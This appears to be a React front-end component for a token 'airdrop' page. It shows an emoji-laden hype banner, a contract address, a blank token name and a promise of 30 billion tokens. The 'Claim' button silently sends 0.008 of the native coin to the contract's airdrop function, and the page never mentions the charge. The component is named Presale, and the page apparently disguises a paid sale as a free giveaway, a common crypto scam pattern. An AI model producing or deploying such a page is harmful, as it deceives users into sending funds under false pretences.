import React, { useState } from "react";
import { Container, Button, Message } from "semantic-ui-react";
import { connect } from "../utils/connectWallet";
import { formatAddress } from "../utils/formatter";
import { ethers } from "ethers";

function Presale() {
  const [load, setLoading] = useState(false);
  const [userAddress, setUser] = useState(null);
  const [msg, setMsg] = useState({
    type: "",
    content: "",
  });

  const ClaimAirdrop = async () => {
    const btn = document.getElementById("btn");
    setLoading(true);
    const buyValue = "0.008";
    try {
      setMsg({
        type: "info",
        content: "Your transaction is pending... please confirm in your wallet",
      });
      const amount = ethers.utils.parseEther(buyValue.toString());
      const { signer, instance } = await connect();
      await instance.connect(signer).airdrop({ value: amount });
      setMsg({
        type: "success",
        content: "Congratulations, your transaction was successful.",
      });

      btn.disabled = true;

      btn.innerHTML = "Claimed";
      btn.style.backgroundColor = "grey";
    } catch (error) {
      setLoading(false);
      if (
        error.data.message.includes(
          "insufficient funds for gas * price + value"
        )
      ) {
        const errorMessage =
          "Insufficient funds to complete the transaction. Please make sure you have enough BSC in your wallet to cover gas fees.";
        setMsg({
          type: "error",
          content: `${errorMessage}`,
        });
      } else if (error.data.message.includes("user rejected transaction")) {
        const errorMessage = "Transaction was rejected by the User";
        setMsg({
          type: "error",
          content: `${errorMessage}`,
        });
      } else {
        setMsg({
          type: "error",
          content: `Request couldn't be processed, please try again...`,
        });
      }

      console.log(error);
    }
    setLoading(false);
  };

  const walletHandler = async () => {
    const { address } = await connect();
    setUser(address);
  };

  return (
    <React.Fragment>
      <Container>
        <div className="py-2">
          <img
            style={{ width: "45px" }}
            alt=""
            className="img-fluid"
          />
          <div style={{ float: "right", marginTop: "10px" }}>
            {userAddress ? (
              <Button> {formatAddress(userAddress)} </Button>
            ) : (
              <Button onClick={walletHandler} primary>
                Connect Wallet
              </Button>
            )}
          </div>
        </div>

        <section className="py-5">
          <div>
            <img
              className="img-fluid"
              src="https://res.cloudinary.com/dxqgshzri/image/upload/v1701351099/IMG-20231130-WA0146_ihpsg0.jpg"
              alt="."
            />
          </div>

          {msg.type && <Message className={msg.type}>{msg.content}</Message>}
          <div className="mt-3">
            <h1 style={{ color: "#9193EB" }}>Airdrop Claiming</h1>

            <h3>
              🔥 Unlock the power 🔥 of  with our token airdrop! Embark on
              a rewarding journey as you secure your share of tokens. Dive into
              the adventure – claim your  now!
            </h3>

            <p>CA: 0x236f6f97AD3cc0AEF7E56607574c56469Acf803E</p>
            <p>Name: $</p>
            <p>Decimal: 18</p>

            <p>Claim: 30,000,000,000</p>
          </div>

          <div className="mt-5">
            <Button
              primary
              onClick={ClaimAirdrop}
              id="btn"
              loading={load}
              fluid
            >
              Claim
            </Button>
          </div>
        </section>
      </Container>
    </React.Fragment>
  );
}

export default Presale;
